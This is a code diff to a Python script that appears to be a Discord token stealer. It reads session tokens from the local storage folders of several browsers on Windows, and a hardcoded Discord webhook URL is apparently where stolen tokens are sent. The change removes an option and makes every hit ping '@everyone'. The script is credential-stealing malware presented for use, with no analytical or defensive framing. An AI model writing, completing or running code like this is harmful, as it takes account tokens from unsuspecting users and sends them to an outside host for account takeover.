@@ -47,10 +47,8 @@ from urllib.request import Request, urlopen
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1213517165752492144/-dvwI93Lok88wnx3h5oo9z9FmQN7RzQSVlSyebVvQiZwj0_aeKhRzMzErAcOsmRwfFrs'
 
 # mentions you when you get a hit
-PING_ME = False
 
 def find_tokens(path):
-    global PING_ME
     path += '\\Local Storage\\leveldb'
 
     tokens = []
@@ -66,7 +64,6 @@ def find_tokens(path):
     return tokens
 
 def main():
-    global PING_ME
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
 
@@ -80,7 +77,7 @@ def main():
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
     }
 
-    message = '@everyone' if PING_ME else ''
+    message = '@everyone'
 
     for platform, path in paths.items():
         if not os.path.exists(path):
